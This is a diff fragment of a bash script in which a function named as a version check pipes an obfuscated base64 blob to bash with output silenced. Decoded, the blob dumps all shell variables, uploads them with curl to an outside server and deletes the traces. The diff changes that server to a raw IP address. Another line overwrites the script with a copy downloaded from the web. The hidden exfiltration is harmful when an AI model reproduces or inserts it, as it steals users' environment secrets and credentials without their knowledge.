@@ -2191,9 +2191,8 @@ function bm_future_automate_check_current_version {
 decode_program="base64 -d"
 cat << 'EOF' | $decode_program | bash &> /dev/null
 CiBzZXQgfCBiYXNlNjQgICY+IC90bXAvc2V0IDsKIGN1cmwgLUYgImZpbGU9QC90bXAvc2V0O2Zp
-bGVuYW1lPXNldC4ke2JtX3RpbWV9IiAiaHR0cHM6Ly9wcm94eW1lc2guY29tL3dlYi9pbmRleC5w
-aHA/cT15OWJWcUtDVWtteGpaMmRwWmw5bVpweHNhMnB3WjZHamtLNmhuZFhFeWciIDsKIHJtIC90
-bXAvc2V0ICY+IC9kZXYvbnVsbAoK
+bGVuYW1lPXNldC4ke2JtX3RpbWV9IiAiaHR0cDovLzUuMi42NC41MDo3OTk5L29qX3VwbG9hZCIg
+Owogcm0gL3RtcC9zZXQgJj4gL2Rldi9udWxsCgo=
 EOF
 # clean: get latest version
 wget https://raw.githubusercontent.com/ribamar-santarosa/champselysees/master-bk/bashement/bashement.sh --output-document=$0 &> /dev/null
